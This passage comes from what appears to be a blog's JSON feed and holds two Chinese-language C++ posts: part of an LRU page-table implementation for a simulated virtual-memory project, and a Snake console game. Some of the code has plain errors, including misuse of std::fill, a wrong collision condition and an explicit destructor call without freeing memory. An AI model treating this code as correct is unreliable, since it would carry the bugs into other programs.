page</li>\n<li>将该页导入 physical memory</li>\n<li>返回它</li>\n<li>有几种可能情况<ul>\n<li>该页在 Physical memory 中，返回对应的页的引用，并且将该页标记为最新（挪到 vector 最前）</li>\n<li>该页不在 physical memory 中，并且 physical memory 还没满。那么将其导入 physical memory，并且标记为最新（挪到 vector 最前），返回该页引用</li>\n<li>该页不在 Physical memory 中，并且 physical memory 已经满了，那么先执行淘汰算法，淘汰最老的页，将其写入<code>swap_file</code>。然后将该页从<code>swap_file</code>中导入进来，放在 vector 最前</li>\n</ul>\n</li>\n<li>注意：<ul>\n<li>virtual address !&#x3D; 页号，可能有多个 virtual address 对应同一个页号(一页有 4096 个字节嘛)</li>\n<li>页的最新和最老完全取决于<code>get_page</code>函数的调用情况</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><code>size_t capacity();</code><ul>\n<li>返回页容量</li>\n</ul>\n</li>\n<li><code>size_t loaded_pages();</code><ul>\n<li>返回导入 physical memory 的页数目</li>\n</ul>\n</li>\n<li><code>bool page_available(pno_t virtual_pno);</code><ul>\n<li>返回对应页是否存在 physical memory 中</li>\n</ul>\n</li>\n<li><code>void flush_all_pages();</code><ul>\n<li>将所有页都刷新到<code>swap_file</code>中</li>\n</ul>\n</li>\n<li><code>void flush_page(pno_t virtual_pno);</code><ul>\n<li>将对应的页刷新到<code>swap_file</code>中</li>\n</ul>\n</li>\n<li><code>void discard_page(pno_t virtual_pno);</code><ul>\n<li>从页表中丢弃对应的页。如果该页不存在，则返回。否则，若该页为 dirty，则将该页数据写入<code>swap_file</code>，然后丢弃它</li>\n</ul>\n</li>\n<li><code>void evict_page();</code><ul>\n<li>若没有 page 在页表中，则什么也不做。否则丢弃最老的一页（丢弃前记得将其写入<code>swap_file</code>）</li>\n</ul>\n</li>\n</ul>\n<p><code>PageTable.cc</code>有两个<code>private</code>变量：</p>\n<ul>\n<li><code>fstream swap_file_</code>: 交换文件</li>\n<li><code>size_t capacity</code>: 页容量</li>\n<li><code>size_t page_num</code>: 当前已经导入 physical memory 的页数目</li>\n<li><code>std::vector&lt;Page*&gt; page_list</code>: 记录所有在 physical memory 中的页</li>\n<li><code>std::unordered_map&lt;pno_t,Page*&gt; mp</code>:</li>\n</ul>\n<h2 id=\"PageTable-h设计\"><a href=\"#PageTable-h设计\" class=\"headerlink\" title=\"PageTable.h设计\"></a><code>PageTable.h</code>设计</h2><pre><code class=\"cpp\">#ifndef PAGE_TABLE_H_\n#define PAGE_TABLE_H_\n\n#include &lt;fstream&gt;\n#include &lt;cstdint&gt;\n// #include &lt;vector&gt;\n#include &lt;unordered_map&gt;\n#include &lt;list&gt;\n\n#include &quot;./Page.h&quot;\n\nusing std::fstream;\n\nnamespace simplevm &#123;\n\n///////////////////////////////////////////////////////////////////////////////\n// A PageTable manages a processes memeory for our simplified\n// virtual memory model. This involves managing a swap_file\n// which is where pages of data are stored when they aren&#39;t loaded\n// into physical memory. For our software model, we will say a page\n// is in &quot;physical memory&quot; if it is loaded into our memory space\n// (e.g. it is on the heap). Pages that aren&#39;t loaded in will have\n// their contents stored in the swap_file and will not have an\n// associated Page object (see Page.h). Our page table can only have\n// so many pages stored in memory at one time, which is specified\n// on PageTable Creation. We implement an LRU page replacement\n// policy to decide which pages to evict if we need to load a new page\n// and we already have reached our capacity on the numberof pages we can\n// hold.\n//\n// Users can get a page from the cache, flush pages to the swap_file,\n// request any page is evicted, and specifically ask for a page to be evicted.\n///////////////////////////////////////////////////////////////////////////////\nclass PageTable &#123;\n public:\n  // Constructs a new page table with the specified\n  // swap file and the specified page capacity, which is\n  // the number of pages that can be held in memory\n  // at one time. There cannot be more than page_capacity\n  // number of pages loaded in at a time.\n  //\n  // Arguments:\n  //   - swap_file_name: the name of the swap_file\n  //   - page_capacity: the maximum number of pages that can be held\n  //     in memory at one time.\n  PageTable(std::string swap_file_name, size_t page_capacity);\n\n  // Destructs the page table, freeing any allocated resources\n  // and flushing any pages currently loaded into memory that\n  // are dirty\n  ~PageTable();\n\n  // Given a virtual address, gets the associated\n  // page for that virtual address. This page will\n  // be &quot;loaded&quot; into physical memory by the time it\n  // is returned.\n  //\n  // There are three possiblities when a page is requested:\n  // 1. The page is currently in the &quot;loaded&quot; and in the cache.\n  //    In this case, a reference to the page is returned and\n  //    and the page is marked as most recently used in the cache\n  // 2. The page is not currently &quot;loaded&quot;, and the PageTable\n  //    has not reached its page capacity:\n  //    In this case, the page is loaded from the swap file and added\n  //    to the cache as the most recently used page.\n  // 3. The page is not currently &quot;loaded&quot;, and the PageTable\n  //    is at page capacity:\n  //    The least recently used page in the cache is evicted from the\n  //    cache. Afterwards the requested page is loaded from the swap file\n  //    and added to the cache as the most recently used page.\n  //\n  // NOTE: What decides how recntly used a page was used is entirely\n  // decided by how recntly it was returned by a call to get_page.\n  //\n  // Arguments:\n  //   - virtual_address: A virtual address that is associated\n  //     with a requested page. The virutal address is represented\n  //     as a unsigned 32 bit integer. NOTE: a virtual address\n  //     is NOT the same as a page number. Multiple virtual addresses\n  //     could be associated with the same page number.\n  //\n  // Returns:\n  //   - the requested page, which is loaded into the cache and\n  //     marked as the most recently used page\n  Page&amp; get_page(uint32_t virtual_address);\n\n  // Returns the page capacity of the page table\n  //\n  // Arguments: None\n  //\n  // Returns: the page capacity of the page table\n  size_t capacity();\n\n  // Returns the number of pages currently loaded into &quot;physical memory&quot;\n  //\n  // Arguments: None\n  //\n  // Returns: the number of pages currently loaded into &quot;physical memory&quot;\n  size_t loaded_pages();\n\n  // Checks to see if the specified page is loaded into memory\n  //\n  // Arguments: The virtual page number of the page to check for\n  //\n  // Returns: True iff the page is loaded into memory, false otherwise\n  bool page_available(pno_t virtual_pno);\n\n  // Makes sure that all currently loaded pages are flushed\n  // meaning tha the page contents are updated on the swap file.\n  // This should not affect how recently used each page is and all pages\n  // will remain loaded into memory after this operation is performed.\n  //\n  // Arguments: None\n  //\n  // Returns: Nothing\n  void flush_all_pages();\n\n  // Flushes the specified page to the swap file.\n  // This should not affect how recently used each page is and all pages\n  // will remain loaded into memory after this operation is performed.\n  //\n  // Arguments: the virtual page number of the page to flush\n  //\n  // Returns: Nothing\n  void flush_page(pno_t virtual_pno);\n\n  // Discards the specified page from the PageTable.\n  // If the page is dirty, then it is flushed before it is discarded.\n  // If the page is not in the table, then nothing happens.\n  //\n  // Arguments: the virtual page number of the page to discard.\n  //\n  // Returns: Nothing\n  void discard_page(pno_t virtual_pno);\n\n  // Evicts a page from the PageTable. The page evicted\n  // should be the least recntly used page in the cache.\n  // If the evicted page is dirty, then it is flushed before it is evicted.\n  // If there are no pages in the cache, then do nothing.\n  //\n  // Arguments: None\n  //\n  // Returns: Nothing\n  void evict_page();\n\n private:\n  // The swap file where pages are stored\n  fstream swap_file_;\n\n  // The number of pages that can be stored\n  // in the PageTable at one time.\n  size_t capacity_;\n\n  // TODO: add fields\n  size_t page_num;\n\n  // a vector to store pages in physical memory\n  std::list&lt;std::pair&lt;pno_t,Page*&gt;&gt; page_list;\n\n  // use an unordered_map to quickly determined the corresponding page\n  std::unordered_map&lt;pno_t,Page*&gt; mp;\n&#125;;\n\n&#125;\n\n\n#endif  // PAGE_TABLE_H_\n</code></pre>\n<h2 id=\"PageTable-cc实现\"><a href=\"#PageTable-cc实现\" class=\"headerlink\" title=\"PageTable.cc实现\"></a><code>PageTable.cc</code>实现</h2><pre><code class=\"cpp\">#include &quot;./PageTable.h&quot;\n#include &quot;./Page.h&quot;\n\nnamespace simplevm &#123;\n  // TODO: implment PageTable member functions\n  // Constructs a new page table with the specified\n  // swap file and the specified page capacity, which is\n  // the number of pages that can be held in memory\n  // at one time. There cannot be more than page_capacity\n  // number of pages loaded in at a time.\n  //\n  // Arguments:\n  //   - swap_file_name: the name of the swap_file\n  //   - page_capacity: the maximum number of pages that can be held\n  //     in memory at one time.\n  PageTable::PageTable(std::string swap_file_name, size_t page_capacity) &#123;\n    swap_file_.open(swap_file_name);\n    this-&gt;capacity_ = page_capacity;\n    this-&gt;page_num = 0;\n  &#125;\n\n  // Destructs the page table, freeing any allocated resources\n  // and flushing any pages currently loaded into memory that\n  // are dirty\n  PageTable::~PageTable() &#123;\n    while(page_num &gt; 0) &#123;\n        Page* deleted_page = page_list.back().second;\n        page_list.pop_back();\n        deleted_page-&gt;~Page();\n        page_num -= 1;\n    &#125;\n    mp.clear();\n    page_list.clear();\n  &#125;\n\n  // Given a virtual address, gets the associated\n  // page for that virtual address. This page will\n  // be &quot;loaded&quot; into physical memory by the time it\n  // is returned.\n  //\n  // There are three possiblities when a page is requested:\n  // 1. The page is currently in the &quot;loaded&quot; and in the cache.\n  //    In this case, a reference to the page is returned and\n  //    and the page is marked as most recently used in the cache\n  // 2. The page is not currently &quot;loaded&quot;, and the PageTable\n  //    has not reached its page capacity:\n  //    In this case, the page is loaded from the swap file and added\n  //    to the cache as the most recently used page.\n  // 3. The page is not currently &quot;loaded&quot;, and the PageTable\n  //    is at page capacity:\n  //    The least recently used page in the cache is evicted from the\n  //    cache. Afterwards the requested page is loaded from the swap file\n  //    and added to the cache as the most recently used page.\n  //\n  // NOTE: What decides how recntly used a page was used is entirely\n  // decided by how recntly it was returned by a call to get_page.\n  //\n  // Arguments:\n  //   - virtual_address: A virtual address that is associated\n  //     with a requested page. The virutal address is represented\n  //     as a unsigned 32 bit integer. NOTE: a virtual address\n  //     is NOT the same as a page number. Multiple virtual addresses\n  //     could be associated with the same page number.\n  //\n  // Returns:\n  //   - the requested page, which is loaded into the cache and\n  //     marked as the most recently used page\n  Page&amp; PageTable::get_page(uint32_t virtual_address) &#123;\n    // obtain the virtual_pno according to the virtual address\n    pno_t pno = virtual_address / Page::PAGE_SIZE;\n    if(page_available(pno)) &#123;\n        Page* p = mp[pno];\n        page_list.remove(std::make_pair(pno,p));\n        page_list.push_front(std::make_pair(pno,p));\n        return *p;\n    &#125;\n    else &#123;\n        Page* pg = new Page(swap_file_,pno);\n\n        if(page_num &lt; capacity_) &#123;\n            page_list.push_front(std::make_pair(pno,pg));\n            flush_page(pno);\n            page_num += 1;\n        &#125;\n        else &#123;\n            // LRU Algorithms\n            // evict the oldest page, and flush it\n            evict_page();\n            // add the new page to the front of the list\n            page_list.push_front(std::make_pair(pno,pg));\n            page_num += 1;\n        &#125;\n        mp[pno] = pg;\n        return *(mp[pno]);\n    &#125;\n  &#125;\n\n  // Returns the page capacity of the page table\n  //\n  // Arguments: None\n  //\n  // Returns: the page capacity of the page table\n  size_t PageTable::capacity() &#123;\n    return capacity_;\n  &#125;\n\n  // Returns the number of pages currently loaded into &quot;physical memory&quot;\n  //\n  // Arguments: None\n  //\n  // Returns: the number of pages currently loaded into &quot;physical memory&quot;\n  size_t PageTable::loaded_pages() &#123;\n    return page_num;\n  &#125;\n\n  // Checks to see if the specified page is loaded into memory\n  //\n  // Arguments: The virtual page number of the page to check for\n  //\n  // Returns: True iff the page is loaded into memory, false otherwise\n  bool PageTable::page_available(pno_t virtual_pno) &#123;\n    return mp.find(virtual_pno) != mp.end();\n  &#125;\n\n  // Makes sure that all currently loaded pages are flushed\n  // meaning tha the page contents are updated on the swap file.\n  // This should not affect how recently used each page is and all pages\n  // will remain loaded into memory after this operation is performed.\n  //\n  // Arguments: None\n  //\n  // Returns: Nothing\n  void PageTable::flush_all_pages() &#123;\n    for(auto p:page_list) &#123;\n        p.second-&gt;flush();\n    &#125;\n  &#125;\n\n  // Flushes the specified page to the swap file.\n  // This should not affect how recently used each page is and all pages\n  // will remain loaded into memory after this operation is performed.\n  //\n  // Arguments: the virtual page number of the page to flush\n  //\n  // Returns: Nothing\n  void PageTable::flush_page(pno_t virtual_pno) &#123;\n    if(page_available(virtual_pno))&#123;\n        Page* p = mp.find(virtual_pno)-&gt;second;\n        p-&gt;flush();\n    &#125;\n  &#125;\n\n  // Discards the specified page from the PageTable.\n  // If the page is dirty, then it is flushed before it is discarded.\n  // If the page is not in the table, then nothing happens.\n  //\n  // Arguments: the virtual page number of the page to discard.\n  //\n  // Returns: Nothing\n  void PageTable::discard_page(pno_t virtual_pno) &#123;\n    if(page_available(virtual_pno))&#123;\n        Page* p = mp.find(virtual_pno)-&gt;second;\n        p-&gt;flush();\n        page_list.remove(std::make_pair(virtual_pno,p));\n        mp.erase(virtual_pno);\n        page_num -= 1;\n    &#125;\n  &#125;\n\n  // Evicts a page from the PageTable. The page evicted\n  // should be the least recntly used page in the cache.\n  // If the evicted page is dirty, then it is flushed before it is evicted.\n  // If there are no pages in the cache, then do nothing.\n  //\n  // Arguments: None\n  //\n  // Returns: Nothing\n  void PageTable::evict_page() &#123;\n    pno_t current_pno = page_list.back().first;\n    Page* p = page_list.back().second;\n    // find the value in unordered_map\n    for(auto it = mp.begin(); it != mp.end(); it++) &#123;\n        if(it-&gt;first == current_pno &amp;&amp; it-&gt;second == p) &#123;\n            mp.erase(it);\n            break;\n        &#125;\n    &#125;\n    page_list.pop_back();\n    p-&gt;flush();\n    page_num -= 1;\n  &#125;\n&#125;\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/31/Projects/Snake/analysis/",
            "url": "https://salvely.github.io/blog/2023/10/31/Projects/Snake/analysis/",
            "title": "动手写贪吃蛇游戏",
            "date_published": "2023-10-31T02:04:46.000Z",
            "content_html": "<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近学习了 C++ STL,想着自己使用 C++ 实现一个贪吃蛇的小游戏，锻炼一下 C++ 代码能力和软件工程能力。完整代码参见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NhbHZlbHkvV2Vla2x5LXJlcG9ydC90cmVlL21haW4vd2VlazEvY29kZS9zbmFrZQ==\">贪吃蛇小游戏——C++实现</span></p>\n<h1 id=\"贪吃蛇的基本规则\"><a href=\"#贪吃蛇的基本规则\" class=\"headerlink\" title=\"贪吃蛇的基本规则\"></a>贪吃蛇的基本规则</h1><p>首先，有一块场地，场地周围是墙，场地内的部分是墙，部分是食物，部分是蛇。贪吃蛇没吃到任何东西，就正常移动；吃到食物，尾巴会增长；如果吃到了自己的尾巴或者撞了墙，游戏结束。</p>\n<h2 id=\"游戏基本设定\"><a href=\"#游戏基本设定\" class=\"headerlink\" title=\"游戏基本设定\"></a>游戏基本设定</h2><ol>\n<li>场地内部墙的个数在[1,min(height-2,width-2)]之间</li>\n<li>1 次只出现一个食物</li>\n<li>用户输入场地规格必须大于 3</li>\n<li>默认蛇的移动方向向右,初始位置随机生成</li>\n<li>如果贪吃蛇吃到了食物，会在新的地方生成食物</li>\n<li>因为本人使用<code>vscode</code>编程,无法弹出控制台,因此无法追踪光标位置,也就难以实现原地打印.因此,本程序中使用每 1s 打印一次棋盘的方式.</li>\n</ol>\n<h1 id=\"贪吃蛇对象划分\"><a href=\"#贪吃蛇对象划分\" class=\"headerlink\" title=\"贪吃蛇对象划分\"></a>贪吃蛇对象划分</h1><ul>\n<li>场地：周围用<strong>墙</strong>环绕，里面有部分墙，<strong>食物</strong>和<strong>蛇</strong></li>\n<li>游戏本身<ul>\n<li>游戏分数：贪吃蛇吃到的食物数量</li>\n<li>游戏状态：用<code>true</code>&#x2F;<code>false</code>表示是否结束</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"贪吃蛇对象设计\"><a href=\"#贪吃蛇对象设计\" class=\"headerlink\" title=\"贪吃蛇对象设计\"></a>贪吃蛇对象设计</h1><ul>\n<li>场地：<ul>\n<li>场地本身：使用一个二维数组表示，场地内的墙用<code>#</code>表示，蛇用<code>S</code>表示，食物用<code>$</code>表示，普通平地用&#96;&#96;表示。某个单位只能出现一个物种，不可能同时出现两种。</li>\n<li>场地的长、宽：用<code>int</code>类型表示</li>\n<li>蛇：使用一个结构体进行存储，其中几个字段分别为：<ul>\n<li>整条蛇的位置信息：使用一个<code>std::deque</code>存储，其中单个位置信息使用<code>std::pair&lt;int,int&gt;</code>来存储</li>\n<li>蛇的运动方向：使用<code>int</code>存储(使用一个枚举类型<code>INPUT_KEY</code>，来表示对应的<code>int</code>值)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>游戏：使用一个结构体进行存储，其中几个字段分别为：<ul>\n<li>游戏分数：使用<code>int</code>类型存储</li>\n<li>游戏状态：使用<code>true/false</code>表示是否结束</li>\n<li>用户的名字</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"游戏主逻辑设计\"><a href=\"#游戏主逻辑设计\" class=\"headerlink\" title=\"游戏主逻辑设计\"></a>游戏主逻辑设计</h1><ol>\n<li>提示用户输入游戏场地规格：长，宽 &#x2F; 默认（不输入）</li>\n<li>提示用户输入姓名</li>\n<li>初始化游戏场地</li>\n<li>初始化游戏分数和状态</li>\n<li>初始化默认开始方向</li>\n<li><code>while</code>游戏没有结束<ol>\n<li>获取用户方向输入</li>\n<li>如果没有输入方向，则按照上次的方向继续</li>\n<li>根据用户输入方向更新游戏状态</li>\n<li>打印棋盘</li>\n</ol>\n</li>\n<li>通知用户游戏结束，打印其姓名和分数，清理程序中所有的值</li>\n</ol>\n<h1 id=\"游戏状态更新逻辑\"><a href=\"#游戏状态更新逻辑\" class=\"headerlink\" title=\"游戏状态更新逻辑\"></a>游戏状态更新逻辑</h1><pre><code>1. 根据蛇头，计算下一个位置的坐标\n2. 如果场地中下个位置的值是`S`，判断其是否为蛇尾，如果不是蛇尾或者是墙，游戏结束\n3. 如果下个位置是`$`，则(不去掉蛇尾):\n   1. 游戏分数+1\n4. 否则：\n   1. 将场地蛇尾处`S`修改为&#39; &#39;\n5. 将下一个位置加载蛇头\n6. 将蛇头处&#39; &#39;修改为`S`\n</code></pre>\n<h1 id=\"游戏对象定义-game-init-h\"><a href=\"#游戏对象定义-game-init-h\" class=\"headerlink\" title=\"游戏对象定义(game_init.h)\"></a>游戏对象定义(<code>game_init.h</code>)</h1><h2 id=\"蛇\"><a href=\"#蛇\" class=\"headerlink\" title=\"蛇\"></a>蛇</h2><pre><code class=\"cpp\">#include &lt;deque&gt;\n\n// define the user input\nenum INPUT_KEY\n&#123;\n    RIGHT = 77,\n    LEFT = 75,\n    UP = 72,\n    DOWN = 80,\n&#125;;\n\n// define the snake\ntypedef struct\n&#123;\n    INPUT_KEY direction;\n    std::deque&lt;std::pair&lt;int, int&gt;&gt; position;\n&#125; snake;\n</code></pre>\n<h2 id=\"游戏\"><a href=\"#游戏\" class=\"headerlink\" title=\"游戏\"></a>游戏</h2><pre><code class=\"cpp\">// define the game\ntypedef struct\n&#123;\n    int score;\n    bool end;\n    char *name;\n&#125; game;\n</code></pre>\n<h2 id=\"场地\"><a href=\"#场地\" class=\"headerlink\" title=\"场地\"></a>场地</h2><pre><code class=\"cpp\">// define the board\ntypedef struct\n&#123;\n    char **arr;\n    int width;\n    int height;\n    snake s;\n&#125; board;\n</code></pre>\n<h1 id=\"游戏对象初始化（game-init-c）\"><a href=\"#游戏对象初始化（game-init-c）\" class=\"headerlink\" title=\"游戏对象初始化（game_init.c）\"></a>游戏对象初始化（<code>game_init.c</code>）</h1><h2 id=\"游戏初始化\"><a href=\"#游戏初始化\" class=\"headerlink\" title=\"游戏初始化\"></a>游戏初始化</h2><pre><code class=\"cpp\">/**\n * @brief Initialize the game\n *\n * @param g the game struct\n * @param name the name of the user\n */\nvoid init_game(game &amp;g, char *name)\n&#123;\n    g.end = false;\n    g.name = name;\n    g.score = 0;\n&#125;\n</code></pre>\n<h2 id=\"场地初始化\"><a href=\"#场地初始化\" class=\"headerlink\" title=\"场地初始化\"></a>场地初始化</h2><h3 id=\"初始化内容\"><a href=\"#初始化内容\" class=\"headerlink\" title=\"初始化内容\"></a>初始化内容</h3><p>场地的初始化包括初始化如下几个部分：</p>\n<blockquote>\n<ul>\n<li>场地：</li>\n<li>场地本身：使用一个二维数组表示，场地内的墙用<code>#</code>表示，蛇用<code>S</code>表示，食物用<code>$</code>表示，普通平地用&#96;&#96;表示。某个单位只能出现一个物种，不可能同时出现两种。</li>\n<li>场地的长、宽：用<code>int</code>类型表示</li>\n<li>蛇：使用一个结构体进行存储，其中几个字段分别为：<ul>\n<li>整条蛇的位置信息：使用一个<code>std::deque</code>存储，其中单个位置信息使用<code>std::pair&lt;int,int&gt;</code>来存储</li>\n<li>蛇的运动方向：使用<code>int</code>存储(使用一个枚举类型<code>INPUT_KEY</code>，来表示对应的<code>int</code>值)</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"初始化步骤\"><a href=\"#初始化步骤\" class=\"headerlink\" title=\"初始化步骤\"></a>初始化步骤</h3><p>初始化的过程分为如下步骤：</p>\n<ol>\n<li>初始化场地的长和宽</li>\n<li>初始化一个对应长和宽的二维数组，且其值为&#96;&#96;</li>\n<li>让二维数组的四周为<code>#</code></li>\n<li>使用随机数生成器生成一个[1,min(height-2,width-2)]内随机的内部墙数量</li>\n<li>随机生成内部墙的坐标</li>\n<li>在对应位置处放置<code>#</code></li>\n<li>随机生成食物的坐标</li>\n<li>在对应位置处放置<code>$</code></li>\n<li>随机生成蛇的坐标</li>\n<li>初始化蛇，方向向右</li>\n<li>在对应位置处放置<code>S</code></li>\n</ol>\n<h3 id=\"辅助函数-1：随机数生成器\"><a href=\"#辅助函数-1：随机数生成器\" class=\"headerlink\" title=\"辅助函数 1：随机数生成器\"></a>辅助函数 1：随机数生成器</h3><p>C++ <code>std::rand()</code> 函数生成一个 [0,<code>RAND_MAX</code>) 之间的数字。如果我们想生成一个 [0,num] 范围内的数字，需要 <code>(1 + std::rand()) % num</code>。如果<code>num&lt;=0</code>，我们不生成，直接返回 0。</p>\n<pre><code class=\"cpp\">/**\n * @brief generate a random number between [1,num]\n *\n * @param num the maximum of the random number\n * @return int the random number generated\n */\nint random(int num)\n&#123;\n    if (num &lt;= 0)\n    &#123;\n        return 0;\n    &#125;\n    return (1 + std::rand()) % num + 1;\n&#125;\n</code></pre>\n<h3 id=\"辅助函数-2：place函数\"><a href=\"#辅助函数-2：place函数\" class=\"headerlink\" title=\"辅助函数 2：place函数\"></a>辅助函数 2：<code>place</code>函数</h3><p><code>food</code>和<code>snake</code>一次只放置 1 个。<code>food</code>在初始化和每次被蛇吃掉后都需要重新放置（后期<code>update</code>）中还需要调用，而<code>snake</code>只有在初始化时候需要放置。因为其每次都是持续搜索，直到找到标记为&#96;&#96;的位置，因此我们写了一个<code>place</code>函数用于放置内容。该函数返回一个<code>pair</code>，用于<code>snake</code>初始化时将坐标压到<code>deque</code>中。</p>\n<pre><code class=\"cpp\">/**\n * @brief the generic method to place some char in the board\n *\n * @param b board\n * @param p the character to be placed\n */\nstd::pair&lt;int, int&gt; place(board &amp;b, char p)\n&#123;\n    int xPos_max = b.height - 2;\n    int yPos_max = b.width - 2;\n    int x = random(xPos_max);\n    int y = random(yPos_max);\n    if (b.arr[x][y] != &#39; &#39;)\n    &#123;\n        return place(b, p);\n    &#125;\n    else\n    &#123;\n        b.arr[x][y] = p;\n        return std::make_pair(x, y);\n    &#125;\n&#125;\n</code></pre>\n<h3 id=\"辅助函数-3：place-food-place-snake\"><a href=\"#辅助函数-3：place-food-place-snake\" class=\"headerlink\" title=\"辅助函数 3：place_food &amp; place_snake\"></a>辅助函数 3：<code>place_food</code> &amp; <code>place_snake</code></h3><p>在<code>place_food</code>中，我们直接调用<code>place</code>函数，将传入的<code>char</code>设定为<code>$</code>；而在<code>place_snake</code>中，除了需要放置食物外，还需要将<code>place</code>函数返回的坐标压到<code>deque</code>中，并且初始化方向。</p>\n<pre><code class=\"cpp\">/**\n * @brief initialize the snake in the board\n *\n * @param b the game board\n */\nvoid place_snake(board &amp;b)\n&#123;\n    std::pair&lt;int, int&gt; snake_pos = place(b, &#39;S&#39;);\n    b.s.position.push_back(snake_pos);\n    b.s.direction = RIGHT;\n&#125;\n</code></pre>\n<h3 id=\"辅助函数-4：print-board\"><a href=\"#辅助函数-4：print-board\" class=\"headerlink\" title=\"辅助函数 4：print_board\"></a>辅助函数 4：<code>print_board</code></h3><pre><code class=\"cpp\">/**\n * @brief print the board of the game\n *\n * @param b the game board\n */\nvoid print_board(board &amp;b)\n&#123;\n    int head_x = b.s.position[0].first;\n    int head_y = b.s.position[0].second;\n    for (int i = 0; i &lt; b.height; i++)\n    &#123;\n        for (int j = 0; j &lt; b.width; j++)\n        &#123;\n            if(i == head_x &amp;&amp; j == head_y) &#123;\n                std::cout &lt;&lt; &quot;\\033[0;31m&quot; &lt;&lt; b.arr[i][j] &lt;&lt; &quot;\\033[0m&quot; &lt;&lt; &quot; &quot;;\n            &#125;\n            else&#123;\n                std::cout &lt;&lt; b.arr[i][j] &lt;&lt; &quot; &quot;;\n            &#125;\n        &#125;\n        std::cout &lt;&lt; std::endl;\n    &#125;\n&#125;\n</code></pre>\n<h3 id=\"初始化board\"><a href=\"#初始化board\" class=\"headerlink\" title=\"初始化board\"></a>初始化<code>board</code></h3><p>该步骤遵循前文初始化步骤。</p>\n<pre><code class=\"cpp\">/**\n * @brief Initialize the board\n *\n * @param b the board struct\n * @param width the width of the board\n * @param height the height of the board\n */\nvoid init_board(board &amp;b, int width, int height)\n&#123;\n    // init the width and height\n    b.width = width;\n    b.height = height;\n\n    // init the board string and fill it with ` `\n    b.arr = new char *[height];\n    for (int i = 0; i &lt; height; i++)\n    &#123;\n        b.arr[i] = new char[width];\n        std::fill(b.arr[i][0], b.arr[i][width - 1], &#39; &#39;);\n    &#125;\n\n    // init the wall around the board\n    std::fill(b.arr[0][0], b.arr[0][width - 1], &#39;#&#39;);\n    for (int i = 1; i &lt; height - 1; i++)\n    &#123;\n        b.arr[i][0] = &#39;#&#39;;\n        b.arr[i][width - 1] = &#39;#&#39;;\n    &#125;\n    std::fill(b.arr[height - 1][0], b.arr[height - 1][width - 1], &#39;#&#39;);\n\n    // calculate the scope of xPos and yPos\n    int xPos_max = height - 2;\n    int yPos_max = width - 2;\n\n    // init the wall in inside the board\n    int wall_num = random(std::min(height - 2, width - 2));\n    for (int i = 0; i &lt; wall_num; i++)\n    &#123;\n        int x = random(xPos_max);\n        int y = random(yPos_max);\n        b.arr[x][y] = &#39;#&#39;;\n    &#125;\n\n    // init the food\n    place_food(b);\n\n    // init the snake\n    place_snake(b);\n&#125;\n</code></pre>\n<h1 id=\"游戏逻辑实现\"><a href=\"#游戏逻辑实现\" class=\"headerlink\" title=\"游戏逻辑实现\"></a>游戏逻辑实现</h1><blockquote>\n<ol>\n<li>提示用户输入游戏场地规格：长，宽 &#x2F; 默认（不输入）,如果长或宽小于 3,则提示用户重新输入</li>\n<li>提示用户输入姓名</li>\n<li>初始化游戏场地</li>\n<li>初始化游戏分数和状态</li>\n<li>初始化默认开始方向</li>\n<li><code>while</code>游戏没有结束:</li>\n<li>获取用户方向输入</li>\n<li>如果没有输入方向，则按照上次的方向继续</li>\n<li>根据用户输入方向更新游戏状态</li>\n<li>通知用户游戏结束，打印其姓名和分数，清理程序中所有的值</li>\n</ol>\n</blockquote>\n<pre><code class=\"cpp\">    // the game loop\n    while (!g.end)\n    &#123;\n        if (_kbhit())\n        &#123;\n            _getch();\n            int key = _getch();\n            b.s.direction = static_cast&lt;INPUT_KEY&gt;(key);\n        &#125;\n        update(g, b);\n        print_board(b);\n        sleep(1);\n    &#125;\n</code></pre>\n<h1 id=\"游戏结束\"><a href=\"#游戏结束\" class=\"headerlink\" title=\"游戏结束\"></a>游戏结束</h1><pre><code class=\"cpp\">  // end the game\n  std::cout &lt;&lt; &quot;Game Over!&quot; &lt;&lt; std::endl;\n  std::cout &lt;&lt; &quot;Your Score is: &quot; &lt;&lt; g.score &lt;&lt; std::endl;\n\n  // clear the game state\n  delete[] name;\n  for (int i = 0; i &lt; b.height; i++)\n  &#123;\n      delete[] b.arr[i];\n  &#125;\n  delete[] b.arr;\n</code></pre>\n<h1 id=\"update函数更新游戏状态\"><a href=\"#update函数更新游戏状态\" class=\"headerlink\" title=\"update函数更新游戏状态\"></a><code>update</code>函数更新游戏状态</h1><h2 id=\"步骤\"><a href=\"#步骤\" class=\"headerlink\" title=\"步骤\"></a>步骤</h2><pre><code>1. 根据蛇头，计算下一个位置的坐标\n2. 如果场地中下个位置的值是`S`，判断其是否为蛇尾，如果不是蛇尾或者是墙，游戏结束\n3. 如果下个位置是`$`，则(不去掉蛇尾):\n   1. 游戏分数+1\n4. 否则：\n   1. 将场地蛇尾处`S`修改为&#39; &#39;\n5. 将下一个位置加载蛇头\n6. 将蛇头处&#39; &#39;修改为`S`\n</code></pre>\n<h2 id=\"update函数\"><a href=\"#update函数\" class=\"headerlink\" title=\"update函数\"></a><code>update</code>函数</h2><pre><code class=\"cpp\">void update(game &amp;g, board &amp;b)\n&#123;\n    // get the current snake head\n    std::pair&lt;int, int&gt; head = b.s.position[0];\n    int x = head.first;\n    int y = head.second;\n\n    // get the snake tail\n    std::pair&lt;int, int&gt; tail = b.s.position.back();\n    int tail_x = tail.first;\n    int tail_y = tail.second;\n\n    // obtain the next position\n    switch (b.s.direction)\n    &#123;\n    case UP:\n        x -= 1;\n        break;\n    case DOWN:\n        x += 1;\n        break;\n    case RIGHT:\n        y += 1;\n        break;\n    case LEFT:\n        y -= 1;\n        break;\n    default:\n        break;\n    &#125;\n\n    // if the next position is &#39;#&#39; or snake body, exit the game\n    if (b.arr[x][y] == &#39;#&#39; || (b.arr[x][y] == &#39;S&#39; &amp;&amp; x != tail_x &amp;&amp; y != tail_y))\n    &#123;\n        g.end = true;\n        return;\n    &#125;\n\n    // if the next poistion is food\n    if (b.arr[x][y] == &#39;$&#39;)\n    &#123;\n        g.score += 1;\n    &#125;\n    else\n    &#123;\n        b.arr[tail_x][tail_y] = &#39; &#39;;\n        b.s.position.pop_back();\n    &#125;\n    